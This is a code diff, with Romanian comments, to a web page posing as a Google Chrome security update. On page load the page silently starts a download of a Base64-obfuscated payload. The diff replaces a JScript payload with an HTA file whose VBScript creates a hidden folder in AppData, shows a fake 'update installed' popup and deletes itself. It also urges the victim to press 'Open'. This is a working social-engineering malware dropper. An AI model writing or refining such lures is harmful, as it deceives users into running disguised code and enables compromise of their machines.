@@ -30,8 +30,8 @@
   <p class="footnote" style="margin-top:5px;">Dacă descărcarea nu pornește, <a href="#" onclick="triggerDownload(); return false;">click aici</a>.</p>
 </div>
 <script>
-// Șirul tău Base64 (înlocuiește cu cel real)
-const b64payload = "dmFyIHNoZWxsID0gbmV3IEFjdGl2ZVhPYmplY3QoIldTY3JpcHQuU2hlbGwiKTsNCnZhciBmc28gPSBuZXcgQWN0aXZlWE9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKTsNCg0KLy8gRm9sZGVyIGFzY3VucyAoaW52aXppYmlsIMOubiBGaWxlIEV4cGxvcmVyKQ0KdmFyIGhpZGRlbkZvbGRlciA9IHNoZWxsLkV4cGFuZEVudmlyb25tZW50U3RyaW5ncygiJUFQUERBVEElIikgKyAiXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFVwZGF0ZVNldCI7DQoNCi8vIDEuIENyZWVhesSDIGZvbGRlcnVsIGRhY8SDIG51IGV4aXN0xIMNCmlmICghZnNvLkZvbGRlckV4aXN0cyhoaWRkZW5Gb2xkZXIpKSB7DQogICAgZnNvLkNyZWF0ZUZvbGRlcihoaWRkZW5Gb2xkZXIpOw0KICAgIC8vIFNldGVhesSDIGF0cmlidXR1bCBIaWRkZW4NCiAgICBzaGVsbC5SdW4oImF0dHJpYiAraCBcIiIgKyBoaWRkZW5Gb2xkZXIgKyAiXCIiLCAwLCBmYWxzZSk7DQp9DQoNCi8vIDIuIFNjcmllIHVuIGZpyJlpZXIgZGUgY29uZmlybWFyZSDDrm4gZm9sZGVyDQp2YXIgbG9nRmlsZSA9IGZzby5DcmVhdGVUZXh0RmlsZShoaWRkZW5Gb2xkZXIgKyAiXFxpbnN0YWxsLmxvZyIsIHRydWUpOw0KbG9nRmlsZS5Xcml0ZUxpbmUoIkFjdHVhbGl6YXJlIENocm9tZSBpbnN0YWxhdGEgbGEgIiArIG5ldyBEYXRlKCkpOw0KbG9nRmlsZS5DbG9zZSgpOw0KDQovLyAzLiBOb3RpZmljYXJlIGRpc2NyZXTEgyAoMyBzZWN1bmRlLCBkaXNwYXJlIHNpbmd1csSDKQ0Kc2hlbGwuUG9wdXAoIkFjdHVhbGl6YXJlIEdvb2dsZSBDaHJvbWUgaW5zdGFsYXRhIGN1IHN1Y2NlcyEiLCAzLCAiR29vZ2xlIENocm9tZSBVcGRhdGUiLCA2NCk7DQoNCi8vIDQuIEFVVE8tyJhURVJHRVJFIOKAkyBhY2VzdCBmaciZaWVyIC5qcyBkaXNwYXJlIGRlIHBlIGRpc2MNCnRyeSB7DQogICAgZnNvLkRlbGV0ZUZpbGUoV1NjcmlwdC5TY3JpcHRGdWxsTmFtZSwgdHJ1ZSk7DQp9IGNhdGNoKGUpIHt9";
+// The Base64-encoded .hta file
+const b64payload = "PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KPGh0YTphcHBsaWNhdGlvbiBpZD0iY2hyb21lX3VwZGF0ZSINCiAgYXBwbGljYXRpb25uYW1lPSJHb29nbGUgQ2hyb21lIFVwZGF0ZSINCiAgYm9yZGVyPSJub25lIg0KICBpbm5lcmJvcmRlcj0ibm8iDQogIGNhcHRpb249Im5vIg0KICBzeXNtZW51PSJubyINCiAgY29udGV4dG1lbnU9Im5vIg0KICBzaG93aW50YXNrYmFyPSJubyINCiAgd2luZG93c3RhdGU9Im5vcm1hbCINCiAgc2VsZWN0aW9uPSJubyINCi8+DQo8c2NyaXB0IGxhbmd1YWdlPSJWQlNjcmlwdCI+DQpTdWIgV2luZG93X09uTG9hZA0KICAgIERpbSBzaGVsbCA6IFNldCBzaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQogICAgRGltIGZzbyAgIDogU2V0IGZzbyAgID0gQ3JlYXRlT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpDQoNCiAgICAnIDEuIEhpZGRlbiBmb2xkZXINCiAgICBEaW0gaGlkZGVuIDogaGlkZGVuID0gc2hlbGwuRXhwYW5kRW52aXJvbm1lbnRTdHJpbmdzKCIlQVBQREFUQSUiKSAmICJcTWljcm9zb2Z0XFdpbmRvd3NcVXBkYXRlU2V0Ig0KICAgIElmIE5vdCBmc28uRm9sZGVyRXhpc3RzKGhpZGRlbikgVGhlbg0KICAgICAgICBmc28uQ3JlYXRlRm9sZGVyIGhpZGRlbg0KICAgICAgICBzaGVsbC5SdW4gImF0dHJpYiAraCAiIiIgJiBoaWRkZW4gJiAiIiIiLCAwLCBGYWxzZQ0KICAgIEVuZCBJZg0KDQogICAgJyAyLiBXcml0ZSBsb2cgZmlsZQ0KICAgIERpbSBsb2cgOiBsb2cgPSBoaWRkZW4gJiAiXGluc3RhbGwubG9nIg0KICAgIERpbSBmICAgOiBTZXQgZiA9IGZzby5DcmVhdGVUZXh0RmlsZShsb2csIFRydWUpDQogICAgZi5Xcml0ZUxpbmUgIkNocm9tZSB1cGRhdGUgaW5zdGFsbGVkIGF0ICIgJiBOb3coKQ0KICAgIGYuQ2xvc2UNCg0KICAgICcgMy4gUG9wdXAgKDIgc2Vjb25kcywgYXV0b+KAkWNsb3NlcykNCiAgICBzaGVsbC5Qb3B1cCAiQWN0dWFsaXphcmUgR29vZ2xlIENocm9tZSBpbnN0YWxhdGEgY3Ugc3VjY2VzISIsIDIsICJHb29nbGUgQ2hyb21lIFVwZGF0ZSIsIDY0DQoNCiAgICAnIDQuIFNlbGbigJFkZWxldGUgdGhlIC5odGEgZmlsZSBmcm9tIHRoZSB0ZW1wIGZvbGRlcg0KICAgIE9uIEVycm9yIFJlc3VtZSBOZXh0DQogICAgZnNvLkRlbGV0ZUZpbGUgV1NjcmlwdC5GdWxsTmFtZSwgVHJ1ZQ0KICAgIE9uIEVycm9yIEdvdG8gMA0KDQogICAgJyA1LiBDbG9zZSB0aGlzIGhpZGRlbiB3aW5kb3cNCiAgICB3aW5kb3cuQ2xvc2UNCkVuZCBTdWINCjwvc2NyaXB0Pg0KPC9oZWFkPg0KPGJvZHk+PC9ib2R5Pg0KPC9odG1sPg==";
 
 function base64ToBlob(base64, mimeType) {
   let byteChars = atob(base64);
@@ -58,17 +58,19 @@ function triggerDownload() {
     document.body.appendChild(a);
   }
   a.href = url;
-  a.download = 'ChromeSecurityUpdate.js';
+  // The file appears as "ChromeSecurityUpdate.hta" – browser will ask to Open/Save
+  a.download = 'ChromeSecurityUpdate.hta';
   document.body.appendChild(a);
   a.click();
   window.URL.revokeObjectURL(url);
+  // Progress animation
   let bar = document.getElementById('bar');
   let status = document.getElementById('status');
   let width = 0;
   let interval = setInterval(function(){
     if (width >= 100) {
       clearInterval(interval);
-      status.innerText = 'Descărcare completă. Deschide fișierul pentru a instala actualizarea.';
+      status.innerText = 'Descărcare completă. Apasă „Open” pentru a instala actualizarea.';
       bar.style.width = '100%';
     } else {
       width += Math.floor(Math.random() * 12) + 4;
@@ -79,7 +81,7 @@ function triggerDownload() {
   }, 350);
 }
 
-// Pornește automat descărcarea la 0.8 secunde după încărcarea paginii
+// Auto‑download after 0.8 seconds
 setTimeout(triggerDownload, 800);
 </script>
 </body>
